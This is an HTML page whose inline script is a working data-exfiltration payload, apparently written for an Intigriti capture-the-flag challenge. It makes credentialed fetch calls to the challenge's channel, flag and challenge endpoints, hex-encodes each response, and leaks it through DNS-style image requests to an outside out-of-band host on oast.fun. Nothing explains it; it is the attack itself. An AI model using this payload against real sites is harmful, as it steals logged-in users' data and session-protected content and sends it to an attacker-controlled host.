<!DOCTYPE html>
<html><head><title>x</title></head>
<body>
<script>
var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}

var base = "https://challenge-0826.challenges.intigriti.io";

// Try fetching channels 11-20 from the challenge API with bot's credentials
for (var ch = 11; ch <= 15; ch++) {
    (function(n){
        fetch(base + "/api/channels/" + n + "/load", {credentials:'include'})
            .then(function(r){ return r.text(); })
            .then(function(t){ e("ch"+n+"ok", t); })
            .catch(function(ex){ e("ch"+n+"err", ex.toString().substring(0,50)); });
    })(ch);
}

// Also try channel 0 and some special ones
fetch(base + "/api/channels/flag/load", {credentials:'include'})
    .then(function(r){ return r.text(); })
    .then(function(t){ e("chflagok", t); })
    .catch(function(ex){ e("chflagerr", ex.toString().substring(0,50)); });

// Read the cookie on the challenge domain via an img error handler
// Actually, let's try fetching the challenge page and reading cookies from response
fetch(base + "/challenge", {credentials:'include'})
    .then(function(r){ 
        e("chalstatus", r.status.toString());
        return r.text(); 
    })
    .then(function(t){ e("chalbody", t.substring(0,100)); })
    .catch(function(ex){ e("chalerr", ex.toString().substring(0,50)); });

// Ping
new Image().src = "http://v6ping." + o + "/";
</script>
</body>
</html>
